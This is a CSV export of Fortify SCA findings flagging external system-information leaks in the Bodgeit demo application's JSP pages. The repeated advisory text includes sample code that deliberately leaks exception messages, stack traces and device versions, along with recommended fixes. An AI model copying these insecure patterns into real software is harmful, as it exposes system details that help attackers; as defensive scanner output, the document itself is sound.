"DemoApps","","Bodgeit","126","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","127","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","130","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/basket.jsp","","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","140","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/contact.jsp","","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","154","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/contact.jsp","","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","163","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/contact.jsp","","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. <b>Example 3:</b> The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range. <pre> ... public static final String TAG = ""NfcActivity""; private static final String DATA_SPLITTER = ""__:DATA:__""; private static final String MIME_TYPE = ""application/my.applications.mimetype""; ... TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE); String VERSION = tm.getDeviceSoftwareVersion(); ... NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this); if (nfcAdapter == null) return; String text = TAG + DATA_SPLITTER + VERSION; NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA, MIME_TYPE.getBytes(), new byte[0], text.getBytes()); NdefRecord[] records = { record }; NdefMessage msg = new NdefMessage(records); nfcAdapter.setNdefPushMessage(msg, this); ... </pre> NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system. Due to this, it's advised to always keep information instead of sending it to a resource directly outside the program. <b>Example 4:</b> The code below broadcasts the stack trace of a caught exception within your app only, so that it cannot be leaked to other apps on the system. There is also the added bonus that this is more efficient than globally broadcasting through the system. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i); } ... </pre> If you are concerned about leaking system data via NFC on an Android device, you could do one of the following three things. Either do not include system data in the messages pushed to other devices in range, or encrypt the payload of the message, or establish secure communication channel at a higher layer.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","236","System Information Leak: External","","High","Open","2015-10-15","Fortify SCA","497","Exposure of System Data to an Unauthorized Control Sphere","","root/header.jsp","","","http://localhost/root/header.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks which are more difficult for an attacker to access. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code leaks Exception information in the HTTP response: <pre> protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { ... PrintWriter out = res.getWriter(); try { ... } catch (Exception e) { out.println(e.getMessage()); } } </pre> This information can be exposed to a remote user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. <b>Example 2:</b> The code below broadcasts the stack trace of a caught exception to all the registered Android receivers. <pre> ... try { ... } catch (Exception e) { String exception = Log.getStackTraceString(e); Intent i = new Intent(); i.setAction(""SEND_EXCEPTION""); i.putExtra(""exception"", exception); view.getContext().sendBroadcast(i); } ... </pre> Here is another scenario specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication. 